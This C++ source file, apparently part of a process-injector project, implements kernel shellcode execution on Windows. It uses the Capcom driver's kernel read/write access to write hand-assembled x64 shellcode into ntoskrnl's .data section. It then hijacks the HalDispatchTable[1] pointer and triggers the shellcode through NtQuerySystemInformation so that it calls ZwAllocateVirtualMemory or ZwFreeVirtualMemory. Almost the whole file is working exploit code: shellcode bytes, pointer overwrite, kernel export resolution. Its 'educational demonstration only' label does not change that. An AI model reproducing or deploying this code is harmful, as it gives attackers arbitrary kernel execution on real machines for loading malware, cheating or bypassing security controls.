// src/Injector/KernelExec.cpp
// Kernel shellcode execution primitive using HalDispatchTable hijack.
// Requires CapcomDriver for kernel R/W access (PID 4 / System process).
//
// Technique:
//   1. Locate ntoskrnl base and HalDispatchTable via PE export walking
//   2. Save original HalDispatchTable[1] pointer
//   3. Write shellcode + parameter block into a zero-filled region of
//      ntoskrnl's .data section (kernel-writable, found at init time)
//   4. Overwrite HalDispatchTable[1] with the shellcode address
//   5. Trigger execution via NtQuerySystemInformation(0,...)
//   6. Shellcode runs in kernel context, calls ZwAllocateVirtualMemory or
//      ZwFreeVirtualMemory, stores results in the parameter block
//   7. Restore HalDispatchTable[1] to its original value
//
// FOR EDUCATIONAL DEMONSTRATION ONLY.
// PatchGuard may detect HalDispatchTable modification on retail builds.

#include "KernelExec.h"
#include "CapcomDriver.h"

#include <winternl.h>
#include <cstring>
#include <stdexcept>
#include <vector>

// Undocumented NT API — triggers HalDispatchTable dispatch.
extern "C" NTSTATUS NTAPI NtQuerySystemInformation(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);

// Kernel function type aliases used by the shellcode.
using ZwAllocateVirtualMemory_t = NTSTATUS(NTAPI*)(
    HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits,
    PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);

using ZwFreeVirtualMemory_t = NTSTATUS(NTAPI*)(
    HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG FreeType);

// ---------------------------------------------------------------------------
// ShellcodeParams — contiguous block placed in kernel memory before the
// shellcode bytes.  The shellcode uses absolute addressing to read its
// arguments and write its results.
// ---------------------------------------------------------------------------
#pragma pack(push, 1)
struct ShellcodeParams {
    uint64_t fnZwAllocateVirtualMemory; // +0x00: ZwAllocateVirtualMemory address
    uint64_t fnZwFreeVirtualMemory;     // +0x08: ZwFreeVirtualMemory address
    uint64_t processHandle;             // +0x10: kernel handle to target process
    uint64_t outBaseAddress;            // +0x18: [out] allocated/freed base address
    uint64_t allocationSize;            // +0x20: size (in/out pointer target)
    uint64_t protect;                   // +0x28: page protection for alloc
    uint64_t ntStatus;                  // +0x30: [out] NTSTATUS from the call
    uint64_t returnAddress;             // +0x38: reserved (unused — return via ret)
};
#pragma pack(pop)

// =========================================================================
//  x64 Shellcode — Allocate Virtual Memory
// =========================================================================
//
//  Register convention on entry (from HalDispatchTable dispatch):
//    RCX = SystemInformationClass (0)
//    RDX = SystemInformation buffer
//    R8  = buffer length
//    R9  = ReturnLength pointer
//
//  All values are ignored; the shellcode reads its own parameter block.
//
//  Byte layout (74 bytes):
//   +0x00  sub   rsp, 0x28               ; shadow space
//   +0x04  mov   r10, <paramsBase>       ; absolute address of ShellcodeParams
//          --- patch offset 6: 8-byte paramsBase ---
//   +0x0E  mov   rcx, [r10 + 0x10]       ; ProcessHandle
//   +0x12  lea   rdx, [r10 + 0x18]       ; &outBaseAddress
//   +0x16  xor   r8d, r8d                ; ZeroBits = 0
//   +0x19  lea   r9,  [r10 + 0x20]       ; &allocationSize (pointer to size)
//   +0x1D  mov   rax, 0x3000             ; MEM_COMMIT | MEM_RESERVE
//   +0x24  mov   [rsp + 0x18], rax       ; AllocationType → callee [RSP+0x20]
//   +0x29  mov   rax, [r10 + 0x28]       ; protect
//   +0x2D  mov   [rsp + 0x20], rax       ; Protect → callee [RSP+0x28]
//   +0x32  mov   rax, [r10 + 0x00]       ; fnZwAllocateVirtualMemory
//   +0x35  call  rax                     ; ZwAllocateVirtualMemory(...)
//   +0x37  mov   r10, <paramsBase>       ; reload (RAX clobbered by call)
//          --- patch offset 57: 8-byte paramsBase ---
//   +0x41  mov   [r10 + 0x30], rax       ; ntStatus = result
//   +0x45  add   rsp, 0x28
//   +0x49  ret

static constexpr uint8_t kAllocShellcode[] = {
    0x48, 0x83, 0xEC, 0x28,                   // 00: sub  rsp, 0x28
    0x49, 0xBA, 0x00, 0x00, 0x00, 0x00,       // 04: mov  r10, <paramsBase>
    0x00, 0x00, 0x00, 0x00,                   //     (8-byte imm at offset 6)
    0x49, 0x8B, 0x4A, 0x10,                   // 0E: mov  rcx, [r10+0x10]
    0x49, 0x8D, 0x52, 0x18,                   // 12: lea  rdx, [r10+0x18]
    0x45, 0x31, 0xC0,                         // 16: xor  r8d, r8d
    0x4D, 0x8D, 0x4A, 0x20,                   // 19: lea  r9,  [r10+0x20]
    0x48, 0xC7, 0xC0, 0x00, 0x30, 0x00, 0x00, // 1D: mov  rax, 0x3000
    0x48, 0x89, 0x44, 0x24, 0x18,             // 24: mov  [rsp+0x18], rax
    0x49, 0x8B, 0x42, 0x28,                   // 29: mov  rax, [r10+0x28]
    0x48, 0x89, 0x44, 0x24, 0x20,             // 2D: mov  [rsp+0x20], rax
    0x49, 0x8B, 0x02,                         // 32: mov  rax, [r10+0x00]
    0xFF, 0xD0,                               // 35: call rax
    0x49, 0xBA, 0x00, 0x00, 0x00, 0x00,       // 37: mov  r10, <paramsBase>
    0x00, 0x00, 0x00, 0x00,                   //     (8-byte imm at offset 57)
    0x49, 0x89, 0x42, 0x30,                   // 41: mov  [r10+0x30], rax
    0x48, 0x83, 0xC4, 0x28,                   // 45: add  rsp, 0x28
    0xC3                                        // 49: ret
};
static constexpr size_t kAllocShellcodeSize = sizeof(kAllocShellcode);
static constexpr size_t kAllocPatchOffset1  = 6;   // first  paramsBase immediate
static constexpr size_t kAllocPatchOffset2  = 57;  // second paramsBase immediate

// =========================================================================
//  x64 Shellcode — Free Virtual Memory
// =========================================================================
//
//  ZwFreeVirtualMemory(HANDLE, PVOID*, PSIZE_T, ULONG FreeType)
//  All four args in registers — no stack parameters needed.
//
//  Byte layout (58 bytes):
//   +0x00  sub   rsp, 0x28               ; shadow space
//   +0x04  mov   r10, <paramsBase>
//          --- patch offset 6: 8-byte paramsBase ---
//   +0x0E  mov   rcx, [r10 + 0x10]       ; ProcessHandle
//   +0x12  lea   rdx, [r10 + 0x18]       ; &outBaseAddress
//   +0x16  lea   r8,  [r10 + 0x20]       ; &allocationSize (pointer to size)
//   +0x1A  mov   r9,  0x8000             ; MEM_RELEASE
//   +0x21  mov   rax, [r10 + 0x08]       ; fnZwFreeVirtualMemory
//   +0x25  call  rax
//   +0x27  mov   r10, <paramsBase>       ; reload
//          --- patch offset 41: 8-byte paramsBase ---
//   +0x31  mov   [r10 + 0x30], rax       ; ntStatus = result
//   +0x35  add   rsp, 0x28
//   +0x39  ret

static constexpr uint8_t kFreeShellcode[] = {
    0x48, 0x83, 0xEC, 0x28,                   // 00: sub  rsp, 0x28
    0x49, 0xBA, 0x00, 0x00, 0x00, 0x00,       // 04: mov  r10, <paramsBase>
    0x00, 0x00, 0x00, 0x00,                   //     (8-byte imm at offset 6)
    0x49, 0x8B, 0x4A, 0x10,                   // 0E: mov  rcx, [r10+0x10]
    0x49, 0x8D, 0x52, 0x18,                   // 12: lea  rdx, [r10+0x18]
    0x4D, 0x8D, 0x42, 0x20,                   // 16: lea  r8,  [r10+0x20]
    0x49, 0xC7, 0xC1, 0x00, 0x80, 0x00, 0x00, // 1A: mov  r9,  0x8000
    0x49, 0x8B, 0x42, 0x08,                   // 21: mov  rax, [r10+0x08]
    0xFF, 0xD0,                               // 25: call rax
    0x49, 0xBA, 0x00, 0x00, 0x00, 0x00,       // 27: mov  r10, <paramsBase>
    0x00, 0x00, 0x00, 0x00,                   //     (8-byte imm at offset 41)
    0x49, 0x89, 0x42, 0x30,                   // 31: mov  [r10+0x30], rax
    0x48, 0x83, 0xC4, 0x28,                   // 35: add  rsp, 0x28
    0xC3                                        // 39: ret
};
static constexpr size_t kFreeShellcodeSize = sizeof(kFreeShellcode);
static constexpr size_t kFreePatchOffset1  = 6;   // first  paramsBase immediate
static constexpr size_t kFreePatchOffset2  = 41;  // second paramsBase immediate

// =========================================================================
//  Singleton
// =========================================================================

KernelExec& KernelExec::GetInstance() {
    static KernelExec instance;
    return instance;
}

// =========================================================================
//  Initialize — one-time setup of kernel addresses and shellcode buffer
// =========================================================================

bool KernelExec::Initialize() {
    if (m_initialized) return true;

    auto& capcom = CapcomDriver::GetInstance();
    if (!capcom.IsLoaded()) return false;

    // ---- Step 1: Locate ntoskrnl base via NtQuerySystemInformation ----
    ULONG bufSize = 0;
    NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)11, nullptr, 0, &bufSize);
    // SystemModuleInformation = 11

    std::vector<uint8_t> buf(bufSize);
    auto* modInfo = reinterpret_cast<PRTL_PROCESS_MODULES>(buf.data());
    NTSTATUS status = NtQuerySystemInformation(
        (SYSTEM_INFORMATION_CLASS)11, buf.data(), bufSize, &bufSize);

    if (status < 0) return false;

    // First module in the list is always ntoskrnl.exe
    m_kernelBase = reinterpret_cast<uintptr_t>(modInfo->Modules[0].ImageBase);
    if (!m_kernelBase) return false;

    // ---- Step 2: Locate HalDispatchTable ----
    if (!LocateHalDispatchTable()) return false;

    // ---- Step 3: Read original HalDispatchTable[1] ----
    // HalDispatchTable is an array of function pointers; index 1 = HalQuerySystemInformation
    uintptr_t halQuerySlot = m_halDispatch + sizeof(uintptr_t); // index 1
    m_originalPtr = capcom.Read<uintptr_t>(4, halQuerySlot);
    if (!m_originalPtr) return false;

    // ---- Step 4: Find a writable zero-filled region in ntoskrnl's .data ----
    // We read the PE section table through the Capcom driver (PID 4 reads kernel VA).
    IMAGE_DOS_HEADER dosHeader = capcom.Read<IMAGE_DOS_HEADER>(4, m_kernelBase);
    if (dosHeader.e_magic != IMAGE_DOS_SIGNATURE) return false;

    IMAGE_NT_HEADERS64 ntHeaders = capcom.Read<IMAGE_NT_HEADERS64>(
        4, m_kernelBase + dosHeader.e_lfanew);
    if (ntHeaders.Signature != IMAGE_NT_SIGNATURE) return false;

    uintptr_t sectionTable = m_kernelBase + dosHeader.e_lfanew
                           + sizeof(IMAGE_NT_HEADERS64);
    uintptr_t dataSectionBase = 0;
    size_t    dataSectionSize = 0;

    for (int i = 0; i < ntHeaders.FileHeader.NumberOfSections; ++i) {
        IMAGE_SECTION_HEADER section = capcom.Read<IMAGE_SECTION_HEADER>(
            4, sectionTable + i * sizeof(IMAGE_SECTION_HEADER));
        // Match either ".data" or "PAGE" (some kernels put writable data in PAGE)
        if (memcmp(section.Name, ".data", 5) == 0 ||
            memcmp(section.Name, "PAGE", 4) == 0) {
            dataSectionBase = m_kernelBase + section.VirtualAddress;
            dataSectionSize = section.Misc.VirtualSize;
            break;
        }
    }

    if (!dataSectionBase || dataSectionSize < 0x1000) return false;

    // Scan for a 256-byte aligned block of zeros inside the writable section.
    m_shellcodeAddr = 0;
    for (uintptr_t scan = dataSectionBase;
         scan < dataSectionBase + dataSectionSize - 0x100;
         scan += 0x100) {
        std::vector<uint8_t> chunk(0x100);
        if (capcom.ReadMemory(4, scan, chunk.data(), 0x100)) {
            bool allZero = true;
            for (size_t j = 0; j < 0x100; ++j) {
                if (chunk[j] != 0x00) { allZero = false; break; }
            }
            if (allZero) {
                m_shellcodeAddr = scan;
                break;
            }
        }
    }

    if (!m_shellcodeAddr) return false;

    m_initialized = true;
    return true;
}

// =========================================================================
//  Shutdown
// =========================================================================

void KernelExec::Shutdown() {
    m_initialized    = false;
    m_kernelBase     = 0;
    m_halDispatch    = 0;
    m_originalPtr    = 0;
    m_shellcodeAddr  = 0;
}

// =========================================================================
//  AllocateRemoteMemory — allocate virtual memory in a target process using
//  kernel shellcode that calls ZwAllocateVirtualMemory.
//
//  NOTE (educational): allocation occurs in the context of the calling
//  thread (our process) because cross-process allocation requires
//  KeStackAttachProcess + EPROCESS resolution, which is beyond the scope
//  of this simplified HalDispatchTable hijack demo.
//  The `targetPid` parameter is accepted for API compatibility but is
//  not currently used by the shellcode.  To target another process, the
//  shellcode would need to resolve PsLookupProcessByProcessId and call
//  KeStackAttachProcess / KeUnstackDetachProcess.
// =========================================================================

uint64_t KernelExec::AllocateRemoteMemory(DWORD targetPid, uintptr_t& outBase,
                                           size_t size, DWORD protect,
                                           HANDLE* outHandle) {
    (void)targetPid; // reserved for future cross-process support

    auto& capcom = CapcomDriver::GetInstance();
    if (!m_initialized || !capcom.IsLoaded())
        return 0xC0000001; // STATUS_UNSUCCESSFUL

    // ---- Build the parameter block ----
    ShellcodeParams params{};
    params.fnZwAllocateVirtualMemory = FindKernelExport("ZwAllocateVirtualMemory");
    params.fnZwFreeVirtualMemory     = FindKernelExport("ZwFreeVirtualMemory");
    params.processHandle             = reinterpret_cast<uint64_t>(
        reinterpret_cast<HANDLE>(static_cast<int64_t>(-1))); // pseudo-handle for current process
    params.allocationSize            = size;
    params.protect                   = protect;
    params.outBaseAddress            = 0;
    params.ntStatus                  = 0;
    params.returnAddress             = 0;

    if (!params.fnZwAllocateVirtualMemory)
        return 0xC0000001;

    // ---- Prepare shellcode buffer: [params] [shellcode] ----
    std::vector<uint8_t> kernelBuf(sizeof(ShellcodeParams) + kAllocShellcodeSize);
    std::memcpy(kernelBuf.data(), &params, sizeof(params));

    // Copy the alloc shellcode template and patch in the params base address
    uint8_t patchedShellcode[kAllocShellcodeSize];
    std::memcpy(patchedShellcode, kAllocShellcode, kAllocShellcodeSize);
    std::memcpy(patchedShellcode + kAllocPatchOffset1, &m_shellcodeAddr, sizeof(m_shellcodeAddr));
    std::memcpy(patchedShellcode + kAllocPatchOffset2, &m_shellcodeAddr, sizeof(m_shellcodeAddr));
    std::memcpy(kernelBuf.data() + sizeof(params), patchedShellcode, kAllocShellcodeSize);

    // ---- Write parameter block + shellcode into kernel memory ----
    if (!capcom.WriteMemory(4, m_shellcodeAddr, kernelBuf.data(), kernelBuf.size()))
        return 0xC0000001;

    // ---- Hijack HalDispatchTable[1] -> shellcode ----
    uintptr_t shellcodeBase = m_shellcodeAddr + sizeof(ShellcodeParams);
    uintptr_t halQuerySlot  = m_halDispatch + sizeof(uintptr_t);
    capcom.Write<uintptr_t>(4, halQuerySlot, shellcodeBase);

    // ---- Trigger execution via NtQuerySystemInformation ----
    // SystemInformationClass 0 causes the kernel to dispatch through
    // HalDispatchTable[1] (HalQuerySystemInformation), which now points
    // to our shellcode.
    ULONG dummy = 0;
    NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)0, &dummy, 0, &dummy);
    // Shellcode has now executed; results are in the kernel buffer.

    // ---- Restore HalDispatchTable[1] ----
    capcom.Write<uintptr_t>(4, halQuerySlot, m_originalPtr);

    // ---- Read back results ----
    ShellcodeParams resultParams = capcom.Read<ShellcodeParams>(4, m_shellcodeAddr);
    outBase = resultParams.outBaseAddress;
    if (outHandle)
        *outHandle = reinterpret_cast<HANDLE>(resultParams.processHandle);

    return resultParams.ntStatus;
}

// =========================================================================
//  FreeRemoteMemory — free virtual memory via kernel shellcode that calls
//  ZwFreeVirtualMemory with MEM_RELEASE.
// =========================================================================

uint64_t KernelExec::FreeRemoteMemory(DWORD targetPid, uintptr_t base, size_t size) {
    (void)targetPid; // reserved for future cross-process support

    auto& capcom = CapcomDriver::GetInstance();
    if (!m_initialized || !capcom.IsLoaded())
        return 0xC0000001; // STATUS_UNSUCCESSFUL

    // ---- Build the parameter block ----
    ShellcodeParams params{};
    params.fnZwAllocateVirtualMemory = 0; // not used by free
    params.fnZwFreeVirtualMemory     = FindKernelExport("ZwFreeVirtualMemory");
    params.processHandle             = reinterpret_cast<uint64_t>(
        reinterpret_cast<HANDLE>(static_cast<int64_t>(-1)));
    params.outBaseAddress            = base;
    params.allocationSize            = size;  // 0 for MEM_RELEASE semantics
    params.protect                   = 0;
    params.ntStatus                  = 0;

    if (!params.fnZwFreeVirtualMemory)
        return 0xC0000001;

    // ---- Prepare shellcode buffer: [params] [shellcode] ----
    std::vector<uint8_t> kernelBuf(sizeof(ShellcodeParams) + kFreeShellcodeSize);
    std::memcpy(kernelBuf.data(), &params, sizeof(params));

    // Copy the free shellcode template and patch in the params base address
    uint8_t patchedShellcode[kFreeShellcodeSize];
    std::memcpy(patchedShellcode, kFreeShellcode, kFreeShellcodeSize);
    std::memcpy(patchedShellcode + kFreePatchOffset1, &m_shellcodeAddr, sizeof(m_shellcodeAddr));
    std::memcpy(patchedShellcode + kFreePatchOffset2, &m_shellcodeAddr, sizeof(m_shellcodeAddr));
    std::memcpy(kernelBuf.data() + sizeof(params), patchedShellcode, kFreeShellcodeSize);

    // ---- Write to kernel memory ----
    if (!capcom.WriteMemory(4, m_shellcodeAddr, kernelBuf.data(), kernelBuf.size()))
        return 0xC0000001;

    // ---- Hijack HalDispatchTable[1] ----
    uintptr_t shellcodeBase = m_shellcodeAddr + sizeof(ShellcodeParams);
    uintptr_t halQuerySlot  = m_halDispatch + sizeof(uintptr_t);
    capcom.Write<uintptr_t>(4, halQuerySlot, shellcodeBase);

    // ---- Trigger execution ----
    ULONG dummy = 0;
    NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)0, &dummy, 0, &dummy);

    // ---- Restore HalDispatchTable[1] ----
    capcom.Write<uintptr_t>(4, halQuerySlot, m_originalPtr);

    // ---- Read back result ----
    ShellcodeParams resultParams = capcom.Read<ShellcodeParams>(4, m_shellcodeAddr);
    return resultParams.ntStatus;
}

// =========================================================================
//  LocateHalDispatchTable — find the HalDispatchTable address in ntoskrnl.
//
//  Strategy:
//    1. Try to resolve "HalDispatchTable" as a named export (works on many
//       Windows 10+ builds).
//    2. Fall back: disassemble the start of HalQuerySystemInformation,
//       scanning for `lea rcx, [rip + disp32]` which references the table.
// =========================================================================

bool KernelExec::LocateHalDispatchTable() {
    auto& capcom = CapcomDriver::GetInstance();

    // Primary path: named export
    uintptr_t halDispatch = FindKernelExport("HalDispatchTable");
    if (halDispatch) {
        m_halDispatch = halDispatch;
        return true;
    }

    // Fallback: find HalQuerySystemInformation and scan its prologue
    uintptr_t halQuery = FindKernelExport("HalQuerySystemInformation");
    if (!halQuery) return false;

    // Read 512 bytes of the function body
    std::vector<uint8_t> code(0x200);
    if (!capcom.ReadMemory(4, halQuery, code.data(), code.size()))
        return false;

    // Scan for:  lea rcx, [rip + disp32]
    // Encoding:  48 8D 0D xx xx xx xx
    for (size_t i = 0; i < code.size() - 7; ++i) {
        if (code[i] == 0x48 && code[i+1] == 0x8D && code[i+2] == 0x0D) {
            int32_t disp = *reinterpret_cast<int32_t*>(code.data() + i + 3);
            m_halDispatch = halQuery + i + 7 + static_cast<int64_t>(disp);
            return true;
        }
    }

    return false;
}

// =========================================================================
//  FindKernelExport — resolve an exported symbol address within ntoskrnl
//  by walking the PE export directory via Capcom kernel reads.
// =========================================================================

uintptr_t KernelExec::FindKernelExport(const std::string& funcName) {
    auto& capcom = CapcomDriver::GetInstance();
    if (!m_kernelBase) return 0;

    // Read DOS header
    IMAGE_DOS_HEADER dos = capcom.Read<IMAGE_DOS_HEADER>(4, m_kernelBase);
    if (dos.e_magic != IMAGE_DOS_SIGNATURE) return 0;

    // Read NT headers
    IMAGE_NT_HEADERS64 nt = capcom.Read<IMAGE_NT_HEADERS64>(
        4, m_kernelBase + dos.e_lfanew);
    if (nt.Signature != IMAGE_NT_SIGNATURE) return 0;

    // Locate export directory
    auto& exportDir = nt.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!exportDir.VirtualAddress || !exportDir.Size) return 0;

    IMAGE_EXPORT_DIRECTORY exports = capcom.Read<IMAGE_EXPORT_DIRECTORY>(
        4, m_kernelBase + exportDir.VirtualAddress);

    uintptr_t namesBase = m_kernelBase + exports.AddressOfNames;
    uintptr_t ordsBase  = m_kernelBase + exports.AddressOfNameOrdinals;
    uintptr_t funcsBase = m_kernelBase + exports.AddressOfFunctions;

    for (DWORD i = 0; i < exports.NumberOfNames; ++i) {
        DWORD nameRva = capcom.Read<DWORD>(4, namesBase + i * sizeof(DWORD));
        char nameBuf[256] = {};
        capcom.ReadMemory(4, m_kernelBase + nameRva, nameBuf, sizeof(nameBuf) - 1);

        if (funcName == nameBuf) {
            WORD ordinal   = capcom.Read<WORD>(4, ordsBase + i * sizeof(WORD));
            DWORD funcRva  = capcom.Read<DWORD>(4, funcsBase + ordinal * sizeof(DWORD));
            return m_kernelBase + funcRva;
        }
    }

    return 0;
}
